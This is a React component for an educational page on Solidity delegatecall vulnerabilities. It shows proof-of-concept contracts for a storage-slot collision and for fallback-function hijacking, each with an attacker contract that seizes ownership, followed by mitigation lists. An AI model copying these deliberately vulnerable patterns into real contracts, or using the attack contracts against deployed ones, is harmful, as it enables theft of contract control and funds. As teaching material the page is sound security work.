import React from 'react';
import { Accordion, Card, ListGroup } from 'react-bootstrap';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Code2,
  BookOpen,
  AlertTriangle,
  Lock,
  FileCode
} from 'lucide-react';

const DelegateCall = () => {
  return (
    <div className="container mt-4">
      <h2 className="mb-4 text-danger">
        <ShieldAlert className="me-2" size={28} />
        DelegateCall Vulnerabilities in Solidity Smart Contracts
      </h2>

      {/* Storage Layout Attack */}
      <Accordion defaultActiveKey="0" className="mb-4">
        <Accordion.Item eventKey="0">
          <Accordion.Header>
            <Code2 className="me-2 text-warning" size={20} />
            Storage Layout Collision Attack
          </Accordion.Header>
          <Accordion.Body>
            <Card>
              <Card.Body>
                <Card.Title>Vulnerability</Card.Title>
                <Card.Text>
                  An attacker can exploit storage slot collisions in delegatecall to manipulate contract state and take ownership by understanding how storage layouts work between contracts.
                </Card.Text>

                <Card.Title>Proof of Concept</Card.Title>
                <pre className="bg-dark text-light p-3 rounded">
                  <code>
{`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Vulnerable Contract
contract HackMe {
    address public owner; // Slot 0 overwrites by attacker 
    address public lib;   // Slot 1

    constructor(address _lib) {
        owner = msg.sender; // Owner is set to the deployer
        lib = _lib;
    }

    function setNum(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}

// Library Contract (Trusted but vulnerable)
contract Library {
    uint256 public num; // This is stored in slot 0

    function setNum(uint256 _num) public {
        num = _num; // This modifies the caller's slot 0
    }
}

// Attacker Contract
contract Attack {
    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        // Overwrites HackMe's owner with attacker's address
        hackMe.setNum(uint256(uint160(address(this))));
    }
}`}
                  </code>
                </pre>

                <Card.Title>Attack Mechanism</Card.Title>
                <ListGroup variant="flush">
                  <ListGroup.Item>
                    <AlertTriangle className="me-2 text-warning" size={18} />
                    Storage slot 0 in both contracts collide (owner and num variables)
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <AlertTriangle className="me-2 text-warning" size={18} />
                    Attacker converts their address to uint256 and calls setNum()
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <AlertTriangle className="me-2 text-warning" size={18} />
                    The delegatecall executes in HackMe's context, overwriting owner
                  </ListGroup.Item>
                </ListGroup>

                <Card.Title className="mt-3">Mitigation</Card.Title>
                <ListGroup variant="flush">
                  <ListGroup.Item>
                    <ShieldCheck className="me-2 text-success" size={18} />
                    Use stateless library contracts
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <ShieldCheck className="me-2 text-success" size={18} />
                    Carefully align storage layouts between contracts
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <ShieldCheck className="me-2 text-success" size={18} />
                    Use OpenZeppelin's Proxy pattern for safe delegatecall
                  </ListGroup.Item>
                </ListGroup>
              </Card.Body>
            </Card>
          </Accordion.Body>
        </Accordion.Item>
      </Accordion>

      {/* Fallback Function Attack */}

      <Accordion className="mb-4">
        <Accordion.Item eventKey="1">
          <Accordion.Header>
            <FileCode className="me-2 text-warning" size={20} />
            Fallback Function Hijacking
          </Accordion.Header>
          <Accordion.Body>
            <Card>
              <Card.Body>
                <Card.Title>Vulnerability</Card.Title>
                <Card.Text>
                  Attackers can exploit delegatecall in fallback functions to execute arbitrary functions and take control of the contract through storage manipulation.
                </Card.Text>

                <Card.Title>Proof of Concept</Card.Title>
                <pre className="bg-dark text-light p-3 rounded">
                  <code>
{`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}`}
                  </code>
                </pre>

                <Card.Title>Attack Flow</Card.Title>
                <ListGroup variant="flush">
                  <ListGroup.Item>
                    <AlertTriangle className="me-2 text-warning" size={18} />
                    Attacker calls non-existent pwn() function
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <AlertTriangle className="me-2 text-warning" size={18} />
                    Fallback function forwards call to library via delegatecall
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <AlertTriangle className="me-2 text-warning" size={18} />
                    Library's pwn() executes in HackMe's context, changing ownership
                  </ListGroup.Item>
                </ListGroup>

                <Card.Title className="mt-3">Mitigation</Card.Title>
                <ListGroup variant="flush">
                  <ListGroup.Item>
                    <ShieldCheck className="me-2 text-success" size={18} />
                    Never use delegatecall in fallback functions
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <ShieldCheck className="me-2 text-success" size={18} />
                    Implement function selector validation
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <ShieldCheck className="me-2 text-success" size={18} />
                    Use explicit interface definitions for external calls
                  </ListGroup.Item>
                </ListGroup>

                <Card.Title className="mt-3">Security Best Practices</Card.Title>
                <ListGroup variant="flush">
                  <ListGroup.Item>
                    <Lock className="me-2 text-success" size={18} />
                    Use immutable contracts for library code
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <Lock className="me-2 text-success" size={18} />
                    Implement access controls on critical functions
                  </ListGroup.Item>
                  <ListGroup.Item>
                    <Lock className="me-2 text-success" size={18} />
                    Audit storage layouts thoroughly when using delegatecall
                  </ListGroup.Item>
                </ListGroup>
              </Card.Body>
            </Card>
          </Accordion.Body>
        </Accordion.Item>


   {/* DEX Implementation Analysis */}


      </Accordion>
    </div>
  );
};

export default DelegateCall;